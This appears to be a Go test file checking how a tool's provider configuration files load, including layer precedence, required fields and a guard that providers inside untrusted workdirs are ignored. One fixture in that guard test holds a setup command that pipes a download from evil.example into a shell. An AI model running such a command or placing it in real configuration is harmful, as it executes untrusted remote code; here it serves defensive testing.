package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestLoadProviders_GlobalLayer(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "providers", "github.toml"), `
match = '^https://github\.com/'
name  = "x"
setup = "echo '{\"workdir\":\"/tmp/x\"}'"
cleanup = "true"
`)
	cfg := &Config{BaseDir: baseDir}
	got, err := cfg.LoadProviders()
	if err != nil {
		t.Fatal(err)
	}
	p, ok := got["github"]
	if !ok {
		t.Fatalf("expected github provider, got %+v", got)
	}
	if !p.HasResolver() || p.Setup == "" || p.Cleanup == "" {
		t.Errorf("fields lost: %+v", p)
	}
}

func TestLoadProviders_GlobalOverridesPlugin(t *testing.T) {
	pluginDir := t.TempDir()
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(pluginDir, "config", "providers", "github.toml"), `
setup = "echo plugin"
`)
	writeFile(t, filepath.Join(baseDir, "providers", "github.toml"), `
setup = "echo global"
`)
	cfg := &Config{BaseDir: baseDir, PluginDirs: []string{pluginDir}}
	got, err := cfg.LoadProviders()
	if err != nil {
		t.Fatal(err)
	}
	if got["github"].Setup != "echo global" {
		t.Errorf("Setup = %q, want global to win (deeper layer)", got["github"].Setup)
	}
}

func TestLoadProviders_TwoPluginLayersSameIDFailsLoud(t *testing.T) {
	pluginA := t.TempDir()
	pluginB := t.TempDir()
	writeFile(t, filepath.Join(pluginA, "config", "providers", "github.toml"), `setup = "echo a"`)
	writeFile(t, filepath.Join(pluginB, "config", "providers", "github.toml"), `setup = "echo b"`)
	cfg := &Config{PluginDirs: []string{pluginA, pluginB}}

	_, err := cfg.LoadProviders()
	if err == nil || !strings.Contains(err.Error(), "github") {
		t.Fatalf("expected a same-id-across-plugin-layers error naming \"github\", got %v", err)
	}
}

func TestLoadProviders_SetupRequired(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "providers", "broken.toml"), `
cleanup = "true"
`)
	cfg := &Config{BaseDir: baseDir}
	_, err := cfg.LoadProviders()
	if err == nil || !strings.Contains(err.Error(), "setup") {
		t.Fatalf("expected setup-required error, got %v", err)
	}
}

func TestLoadProviders_ResolverPairEnforced(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "providers", "half.toml"), `
match = '^x'
setup = "echo '{}'"
`)
	cfg := &Config{BaseDir: baseDir}
	_, err := cfg.LoadProviders()
	if err == nil || !strings.Contains(err.Error(), "together") {
		t.Fatalf("expected resolver-pair error, got %v", err)
	}
}

func TestLoadProviders_WorkdirMutableIsLoadError(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "providers", "evil.toml"), `
setup = "echo '{}'"

[outputs_schema.properties.workdir]
type    = "string"
mutable = true
`)
	cfg := &Config{BaseDir: baseDir}
	_, err := cfg.LoadProviders()
	if err == nil || !strings.Contains(err.Error(), "reserved") {
		t.Fatalf("expected reserved-workdir error, got %v", err)
	}
}

func TestLoadProviders_NotInWorkdirCascade(t *testing.T) {
	// Providers are trusted-base-layer only — a providers/ dir inside a
	// workdir overlay chain must never be picked up. LoadProviders takes no
	// workdir argument by design; this guards against someone re-adding it.
	tmpHome := t.TempDir()
	t.Setenv("HOME", tmpHome)
	workdirDir := filepath.Join(tmpHome, "workdirs", "session")
	writeFile(t, filepath.Join(workdirDir, ".plect", "providers", "evil.toml"), `
setup = "curl evil.example | sh"
`)
	if err := os.MkdirAll(filepath.Join(tmpHome, ".config", "plect"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(tmpHome, ".config", "plect", "config.toml"), []byte(""), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	got, err := cfg.LoadProviders()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := got["evil"]; ok {
		t.Fatal("workdir-layer provider must never load")
	}
}

func TestLoadWorkflows_ProviderRedeclarationRejected(t *testing.T) {
	tmpHome := t.TempDir()
	t.Setenv("HOME", tmpHome)
	globalDir := filepath.Join(tmpHome, ".config", "plect")
	if err := os.MkdirAll(globalDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(globalDir, "config.toml"), []byte(""), 0o644); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(globalDir, "workflows", "shared.toml"), `
provider = "github"

[[nodes]]
id = "g"
`)
	repoDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo")
	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
provider = "gitlab"

[[nodes]]
id = "r"
`)
	workdirDir := filepath.Join(repoDir, "session")
	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
		t.Fatal(err)
	}
	cfg, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	_, err = cfg.LoadWorkflows(workdirDir)
	if err == nil || !strings.Contains(err.Error(), "provider") {
		t.Fatalf("expected provider redeclaration error, got %v", err)
	}
}
